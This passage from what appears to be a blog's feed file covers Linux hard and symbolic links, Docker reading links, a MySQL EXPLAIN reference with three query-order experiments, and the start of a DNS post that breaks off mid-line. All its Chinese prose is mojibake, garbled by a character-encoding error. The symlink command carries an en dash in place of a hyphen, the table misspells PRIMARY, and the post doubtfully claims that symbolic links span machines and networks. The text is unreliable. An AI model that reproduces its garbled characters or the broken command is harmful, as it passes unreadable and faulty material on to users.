        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Linux é“¾æ¥åˆ†ä¸¤ç§ï¼Œä¸€ç§è¢«ç§°ä¸ºç¡¬é“¾æ¥ï¼ˆHard Linkï¼‰ï¼Œå¦ä¸€ç§è¢«ç§°ä¸ºç¬¦å·é“¾æ¥ï¼ˆSymbolic Linkï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>ln</code>å‘½ä»¤äº§ç”Ÿç¡¬é“¾æ¥ã€‚</p><p><img src="/images/QQ20170206-155521@2x.jpg"></p><h3 id="ç¡¬è¿æ¥"><a href="#ç¡¬è¿æ¥" class="headerlink" title="ç¡¬è¿æ¥"></a>ç¡¬è¿æ¥</h3><p>ç¡¬è¿æ¥æŒ‡é€šè¿‡ç´¢å¼•èŠ‚ç‚¹æ¥è¿›è¡Œè¿æ¥ã€‚åœ¨Linuxçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¿å­˜åœ¨ç£ç›˜åˆ†åŒºä¸­çš„æ–‡ä»¶ä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹éƒ½ç»™å®ƒåˆ†é…ä¸€ä¸ªç¼–å·ï¼Œç§°ä¸ºç´¢å¼•èŠ‚ç‚¹å·ï¼ˆInode Indexï¼‰ã€‚åœ¨ Linux ä¸­ï¼Œå¤šä¸ªæ–‡ä»¶åæŒ‡å‘åŒä¸€ç´¢å¼•èŠ‚ç‚¹æ˜¯å­˜åœ¨çš„ã€‚ä¸€èˆ¬è¿™ç§è¿æ¥å°±æ˜¯ç¡¬è¿æ¥ã€‚ç¡¬è¿æ¥çš„ä½œç”¨æ˜¯å…è®¸ä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªæœ‰æ•ˆè·¯å¾„åï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥å»ºç«‹ç¡¬è¿æ¥åˆ°é‡è¦æ–‡ä»¶ï¼Œä»¥é˜²æ­¢â€œè¯¯åˆ â€çš„åŠŸèƒ½ã€‚å…¶åŸå› å¦‚ä¸Šæ‰€è¿°ï¼Œå› ä¸ºå¯¹åº”è¯¥ç›®å½•çš„ç´¢å¼•èŠ‚ç‚¹æœ‰ä¸€ä¸ªä»¥ä¸Šçš„è¿æ¥ã€‚åªåˆ é™¤ä¸€ä¸ªè¿æ¥å¹¶ä¸å½±å“ç´¢å¼•èŠ‚ç‚¹æœ¬èº«å’Œå…¶å®ƒçš„è¿æ¥ï¼Œ<strong>åªæœ‰å½“æœ€åä¸€ä¸ªè¿æ¥è¢«åˆ é™¤åï¼Œæ–‡ä»¶çš„æ•°æ®å—åŠç›®å½•çš„è¿æ¥æ‰ä¼šè¢«é‡Šæ”¾</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–‡ä»¶çœŸæ­£åˆ é™¤çš„æ¡ä»¶æ˜¯ä¸ä¹‹ç›¸å…³çš„æ‰€æœ‰ç¡¬è¿æ¥æ–‡ä»¶å‡è¢«åˆ é™¤ã€‚  </p><p><strong>ç¡¬é“¾æ¥æ–‡ä»¶å’Œæºæ–‡ä»¶è™½ç„¶çœ‹èµ·æ¥åƒæ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åªå ç”¨ä¸€ä¸ªæ–‡ä»¶çš„ç£ç›˜ç©ºé—´ã€‚</strong>  </p><p><strong>ç¡¬è¿æ¥ä¸å¯ä»¥ä½œç”¨äºç›®å½•</strong>ã€‚å› ä¸ºæ¯ä¸ªç›®å½•ä¸‹é¢éƒ½ä¼šæœ‰ä¸€ä¸ª<code>.</code>å’Œ<code>..</code>ä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªç›®å½•ä¸‹é¢çš„å­ç›®å½•è‚¯å®šä¼šæœ‰å®ƒæœ¬èº«å’Œå®ƒä¸Šä¸€çº§ç›®å½•ï¼Œé‚£ä¹ˆä¸€æ—¦è®¾ç½®äº†ç¡¬é“¾æ¥åˆ™ä¼šé€ æˆä¸€ç§æ··ä¹±ï¼Œè®¾ç½®ä¼šå¯¼è‡´æ­»å¾ªç¯ã€‚ç¡¬é“¾æ¥çš„æ–‡ä»¶å¹¶ä¸ä¼šå ç”¨ç©ºé—´å¤§å°ï¼Œå®ƒåªæ˜¯å¤åˆ¶äº†è¯¥æ–‡ä»¶çš„ä¸€ä»½<code>inode</code>ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="è½¯è¿æ¥"><a href="#è½¯è¿æ¥" class="headerlink" title="è½¯è¿æ¥"></a>è½¯è¿æ¥</h3><p>è½¯è¿æ¥å¯ä»¥ç†è§£ä¸ºï¼Œæºæ–‡ä»¶çš„å¿«æ·æ–¹å¼ï¼Œè½¯è¿æ¥æ–‡ä»¶è®°å½•çš„æ˜¯æºæ–‡ä»¶çš„è·¯å¾„ï¼Œå ç”¨ç©ºé—´éå¸¸å°ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ã€‚åœ¨ç¬¦å·è¿æ¥ä¸­ï¼Œ<strong>æ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«çš„æœ‰å¦ä¸€æ–‡ä»¶çš„ä½ç½®ä¿¡æ¯</strong>ã€‚<br>è½¯é“¾æ¥å…‹æœäº†ç¡¬é“¾æ¥çš„ä¸è¶³ï¼Œæ²¡æœ‰ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„é™åˆ¶ï¼Œä»»ä½•ç”¨æˆ·å¯ä»¥åˆ›å»ºæŒ‡å‘ç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å› è€Œç°åœ¨æ›´ä¸ºå¹¿æ³›ä½¿ç”¨ï¼Œå®ƒå…·æœ‰æ›´å¤§çš„çµæ´»æ€§ï¼Œç”šè‡³ <strong>å¯ä»¥è·¨è¶Šä¸åŒæœºå™¨ã€ä¸åŒç½‘ç»œå¯¹æ–‡ä»¶è¿›è¡Œé“¾æ¥</strong>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln â€“s æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://blog.csdn.net/longerzone/article/details/23870297">ã€1ã€‘</a> <a href="http://www.cnblogs.com/xiaochaohuashengmi/archive/2011/10/05/2199534.html">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç†è§£Docker</title>
      <link href="/post/understand-docker.html"/>
      <url>/post/understand-docker.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://jm.taobao.org/2016/05/12/introduction-to-docker/">ã€1ã€‘</a><br><a href="http://coolshell.cn/articles/17049.html">ã€2ã€‘</a><br><a href="http://dockone.io/article/1570">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Explain è§£é‡Š</title>
      <link href="/post/mysql-explain.html"/>
      <url>/post/mysql-explain.html</url>
      
        <content type="html"><![CDATA[<h3 id="Mysql-Explain-è§£é‡Š"><a href="#Mysql-Explain-è§£é‡Š" class="headerlink" title="Mysql Explain è§£é‡Š"></a>Mysql Explain è§£é‡Š</h3><table><thead><tr><th>åˆ—å</th><th>ç±»å‹</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><strong>id</strong></td><td></td><td>SELECTè¯­å¥çš„IDç¼–å·,ä¼˜å…ˆæ‰§è¡Œç¼–å·è¾ƒå¤§çš„æŸ¥è¯¢,å¦‚æœç¼–å·ç›¸åŒ,åˆ™ä»ä¸Šå‘ä¸‹æ‰§è¡Œ</td></tr><tr><td><strong>select_type</strong></td><td>SIMPLE</td><td>ä¸€æ¡æ²¡æœ‰UNIONæˆ–å­æŸ¥è¯¢éƒ¨åˆ†çš„SELECTè¯­å¥</td></tr><tr><td>-</td><td>PIMARY</td><td>æœ€å¤–å±‚æˆ–æœ€å·¦ä¾§çš„SELECTè¯­å¥</td></tr><tr><td>-</td><td>UNION</td><td>UNIONè¯­å¥é‡Œçš„ç¬¬äºŒæ¡æˆ–æœ€åä¸€æ¡SELECTè¯­å¥</td></tr><tr><td>-</td><td>DEPENDENT UNION</td><td>å’ŒUNIONç±»å‹çš„å«ä¹‰ç›¸ä¼¼,ä½†éœ€è¦ä¾èµ–äºæŸä¸ªå¤–å±‚æŸ¥è¯¢</td></tr><tr><td>-</td><td>UNION RESULT</td><td>ä¸€æ¡UNIONè¯­å¥çš„ç»“æœ</td></tr><tr><td>-</td><td>SUBQUERY</td><td>å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ªSELECTå­å¥</td></tr><tr><td>-</td><td>DEPENDENT SUBQUERY</td><td>å’ŒSUBQUERYç±»å‹çš„å«ä¹‰ç›¸ä¼¼,ä½†éœ€è¦ä¾èµ–äºæŸä¸ªå¤–å±‚æŸ¥è¯¢</td></tr><tr><td>-</td><td>DERIVED</td><td>FROMå­å¥é‡Œçš„å­æŸ¥è¯¢</td></tr><tr><td><strong>table</strong></td><td>t1</td><td>å„è¾“å‡ºè¡Œé‡Œçš„ä¿¡æ¯æ˜¯å…³äºå“ªä¸ªæ•°æ®è¡¨çš„</td></tr><tr><td><strong>Partitions</strong></td><td>NULL</td><td>å°†è¦ä½¿ç”¨çš„åˆ†åŒº.åªæœ‰EXPLAIN PARTITIONS â€¦è¯­å¥æ‰ä¼šæ˜¾ç¤ºè¿™ä¸€åˆ—.éåˆ†åŒºè¡¨æ˜¾ç¤ºä¸ºNULL</td></tr><tr><td><strong>type</strong></td><td></td><td>è”æ¥æ“ä½œçš„ç±»å‹,æ€§èƒ½ç”±å¥½åˆ°å·®ä¾æ¬¡å¦‚ä¸‹</td></tr><tr><td>-</td><td>system</td><td>è¡¨ä¸­ä»…æœ‰ä¸€è¡Œ</td></tr><tr><td>-</td><td>const</td><td>å•è¡¨ä¸­æœ€å¤šæœ‰ä¸€ä¸ªåŒ¹é…è¡Œ</td></tr><tr><td>-</td><td>eq_ref</td><td>è”æ¥æŸ¥è¯¢ä¸­,å¯¹äºå‰è¡¨çš„æ¯ä¸€è¡Œ,åœ¨æ­¤è¡¨ä¸­åªæŸ¥è¯¢ä¸€æ¡è®°å½•,ä½¿ç”¨äº†PRIMARYæˆ–UNIQUE</td></tr><tr><td>-</td><td>ref</td><td>è”æ¥æŸ¥è¯¢ä¸­,å¯¹äºå‰è¡¨çš„æ¯ä¸€è¡Œ,åœ¨æ­¤è¡¨ä¸­åªæŸ¥è¯¢ä¸€æ¡è®°å½•,ä½¿ç”¨äº†INDEX</td></tr><tr><td>-</td><td>ref_or_null</td><td>è”æ¥æŸ¥è¯¢ä¸­,å¯¹äºå‰è¡¨çš„æ¯ä¸€è¡Œ,åœ¨æ­¤è¡¨ä¸­åªæŸ¥è¯¢ä¸€æ¡è®°å½•,ä½¿ç”¨äº†INDEX,ä½†æ˜¯æ¡ä»¶ä¸­æœ‰NULLå€¼æŸ¥è¯¢</td></tr><tr><td>-</td><td>index_merge</td><td>å¤šä¸ªç´¢å¼•åˆå¹¶</td></tr><tr><td>-</td><td>unique_subquery</td><td>ä¸¾ä¾‹è¯´æ˜: value IN (SELECT primary_key FROM single_table WHERE some_expr)</td></tr><tr><td>-</td><td>index_subquery</td><td>ä¸¾ä¾‹è¯´æ˜: value IN (SELECT key_column FROM single_table WHERE some_expr)</td></tr><tr><td>-</td><td>range</td><td>åªæ£€ç´¢ç»™å®šèŒƒå›´çš„è¡Œ,åŒ…æ‹¬å¦‚ä¸‹æ“ä½œç¬¦: &#x3D;, &lt;&gt;, &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D;, IS NULL, &lt;&#x3D;&gt;, BETWEEN, or IN()</td></tr><tr><td>-</td><td>index</td><td>æ‰«æç´¢å¼•æ ‘(ç•¥æ¯”ALLå¿«,å› ä¸ºç´¢å¼•æ–‡ä»¶é€šå¸¸æ¯”æ•°æ®æ–‡ä»¶å°)</td></tr><tr><td>-</td><td>ALL</td><td>å‰è¡¨çš„æ¯ä¸€è¡Œæ•°æ®éƒ½è¦è·Ÿæ­¤è¡¨åŒ¹é…,å…¨è¡¨æ‰«æ</td></tr><tr><td><strong>possible_keys</strong></td><td>NULL</td><td>MySQLè®¤ä¸ºåœ¨å¯èƒ½ä¼šç”¨åˆ°çš„ç´¢å¼•.NULLè¡¨ç¤ºæ²¡æœ‰æ‰¾åˆ°ç´¢å¼•</td></tr><tr><td><strong>key</strong></td><td>NULL</td><td>æ£€ç´¢æ—¶,å®é™…ç”¨åˆ°çš„ç´¢å¼•åç§°.å¦‚æœç”¨äº†index_mergeè”æ¥ç±»å‹,æ­¤æ—¶ä¼šåˆ—å‡ºå¤šä¸ªç´¢å¼•åç§°,NULLè¡¨ç¤ºæ²¡æœ‰æ‰¾åˆ°ç´¢å¼•ã€‚å¯ä»¥ä½¿ç”¨ <code>force index (index_name)</code> å¼ºåˆ¶æŒ‡å®šç´¢å¼•</td></tr><tr><td><strong>key_len</strong></td><td>NULL</td><td>å®é™…ä½¿ç”¨çš„ç´¢å¼•çš„é•¿åº¦.å¦‚æœæ˜¯å¤åˆç´¢å¼•,é‚£ä¹ˆåªæ˜¾ç¤ºä½¿ç”¨çš„æœ€å·¦å‰ç¼€çš„å¤§å°</td></tr><tr><td><strong>ref</strong></td><td>NULL</td><td>MySQLç”¨æ¥ä¸ç´¢å¼•å€¼æ¯”è¾ƒçš„å€¼, å¦‚æœæ˜¯å•è¯constæˆ–è€…???,åˆ™è¡¨ç¤ºæ¯”è¾ƒå¯¹è±¡æ˜¯ä¸€ä¸ªå¸¸æ•°.å¦‚æœæ˜¯æŸä¸ªæ•°æ®åˆ—çš„åç§°,åˆ™è¡¨ç¤ºæ¯”è¾ƒæ“ä½œæ˜¯é€ä¸ªæ•°æ®åˆ—è¿›è¡Œçš„.NULLè¡¨ç¤ºæ²¡æœ‰ä½¿ç”¨ç´¢å¼•</td></tr><tr><td><strong>rows</strong></td><td></td><td>MySQLä¸ºå®ŒæˆæŸ¥è¯¢è€Œéœ€è¦åœ¨æ•°æ®è¡¨é‡Œæ£€æŸ¥çš„è¡Œæ•°çš„ä¼°ç®—å€¼.è¿™ä¸ªè¾“å‡ºåˆ—é‡Œæ‰€æœ‰çš„å€¼çš„ä¹˜ç§¯å°±æ˜¯å¿…é¡»æ£€æŸ¥çš„æ•°æ®è¡Œçš„å„ç§å¯èƒ½ç»„åˆçš„ä¼°ç®—å€¼</td></tr><tr><td><strong>Extra</strong></td><td>Using filesort</td><td>éœ€è¦å°†ç´¢å¼•å€¼å†™åˆ°æ–‡ä»¶ä¸­å¹¶ä¸”æ’åº,è¿™æ ·æŒ‰é¡ºåºæ£€ç´¢ç›¸å…³æ•°æ®è¡Œ</td></tr><tr><td>-</td><td>Using index</td><td>MySQLå¯ä»¥ä¸å¿…æ£€æŸ¥æ•°æ®æ–‡ä»¶, åªä½¿ç”¨ç´¢å¼•ä¿¡æ¯å°±èƒ½æ£€ç´¢æ•°æ®è¡¨ä¿¡æ¯</td></tr><tr><td>-</td><td>Using temporary</td><td>åœ¨ä½¿ç”¨ GROUP BY æˆ– ORDER BY æ—¶,éœ€è¦åˆ›å»ºä¸´æ—¶è¡¨,ä¿å­˜ä¸­é—´ç»“æœé›†</td></tr><tr><td>-</td><td>Using where</td><td>åˆ©ç”¨SELECTè¯­å¥ä¸­çš„WHEREå­å¥é‡Œçš„æ¡ä»¶è¿›è¡Œæ£€ç´¢æ“ä½œ</td></tr></tbody></table><h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><h4 id="å®éªŒ1"><a href="#å®éªŒ1" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h4><blockquote><p>å‚ç…§ç‰©</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>64</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using filesort</td></tr></tbody></table><h4 id="å®éªŒ2"><a href="#å®éªŒ2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h4><blockquote><p>è°ƒæ•´å­å¥é¡ºåº(6,7 -&gt; 4,5) å¯¹æ¯”å®éªŒ1</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>64</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr></tbody></table><h4 id="å®éªŒ3"><a href="#å®éªŒ3" class="headerlink" title="å®éªŒ3"></a>å®éªŒ3</h4><blockquote><p>è°ƒæ•´å­å¥é¡ºåº(10,11 -&gt; 8,9) å¯¹æ¯”å®éªŒ2</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>65</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr></tbody></table><ol><li>è¡¨è¿æ¥ä¸­æœ‰å­æŸ¥è¯¢çš„å…ˆæ‰§è¡Œ(å¯¹æ¯”å®éªŒ1ã€2ã€3)ï¼Œç›¸åŒæƒ…å†µä¸‹æ’åœ¨åé¢çš„ä¼˜å…ˆçº§é«˜(å¯¹æ¯”å®éªŒ1ã€2)ã€‚</li><li>è¡¨è¿æ¥ï¼Œä»ä¸Šåˆ°ä¸‹æ‰§è¡Œ(å¯¹æ¯”å®éªŒ2ã€3)</li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://github.com/Yhzhtk/note/issues/39">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¿®æ”¹DNS</title>
      <link href="/post/modify-dns.html"/>
      <url>/post/modify-dns.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linuxä¸´æ—¶æˆ–æ°¸ä¹…ä¿®æ”¹DNS"><a href="#Linuxä¸´æ—¶æˆ–æ°¸ä¹…ä¿®æ”¹DNS" class="headerlink" title="Linuxä¸´æ—¶æˆ–æ°¸ä¹…ä¿®æ”¹DNS"></a>Linuxä¸´æ—¶æˆ–æ°¸ä¹…ä¿®æ”¹DNS</h3><h3 id="ä¸´æ—¶ä¿®æ”¹DNS"><a href="#ä¸´æ—¶ä¿®æ”¹DNS" class="headerlink" title="ä¸´æ—¶ä¿®æ”¹DNS"></a>ä¸´æ—¶ä¿®æ”¹DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver 